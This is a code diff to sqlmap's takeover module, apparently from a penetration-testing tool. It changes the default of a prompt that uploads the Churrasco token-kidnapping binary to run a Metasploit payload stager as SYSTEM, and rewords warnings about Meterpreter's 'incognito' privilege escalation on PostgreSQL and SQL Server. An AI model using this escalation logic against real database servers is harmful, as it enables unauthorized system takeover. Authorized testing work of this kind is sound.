@@ -61,11 +61,11 @@ class Takeover(Abstraction, Metasploit, Registry):
     def uploadChurrasco(self):
         msg  = "do you want sqlmap to upload Churrasco and call the "
         msg += "Metasploit payload stager as its argument so that it "
-        msg += "will be started as SYSTEM? [Y/n] "
+        msg += "will be started as SYSTEM? [y/N] "
 
-        output = readInput(msg, default="Y")
+        output = readInput(msg, default="N")
 
-        if not output or output[0] in ( "y", "Y" ):
+        if output and output[0] in ( "y", "Y" ):
             tmpFile = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_CONTRIB_PATH, "tokenkidnapping", "Churrasco.exe_"))
             
             wFile                 = tmpFile.name
@@ -168,18 +168,15 @@ class Takeover(Abstraction, Metasploit, Registry):
 
                 elif kb.dbms == "PostgreSQL":
                     warnMsg  = "by default PostgreSQL on Windows runs as postgres "
-                    warnMsg += "user which has no Windows Impersonation "
-                    warnMsg += "Tokens: it is unlikely that the privilege "
-                    warnMsg += "escalation via 'incognito' extension will "
-                    warnMsg += "be successful"
+                    warnMsg += "user which has no access to LSASS: it is "
+                    warnMsg += "unlikely that the privilege escalation "
+                    warnMsg += "via 'incognito' extension will be successful"
                     logger.warn(warnMsg)
 
                 elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                     warnMsg  = "often Microsoft SQL Server %s " % kb.dbmsVersion[0]
-                    warnMsg += "runs as Network Service which has no Windows "
-                    warnMsg += "Impersonation Tokens within all threads, this "
-                    warnMsg += "makes Meterpreter's 'incognito' extension "
-                    warnMsg += "to fail to list tokens"
+                    warnMsg += "runs as Network Service which has Windows "
+                    warnMsg += "Impersonation Tokens"
                     logger.warn(warnMsg)
 
                     uploaded = self.uploadChurrasco()
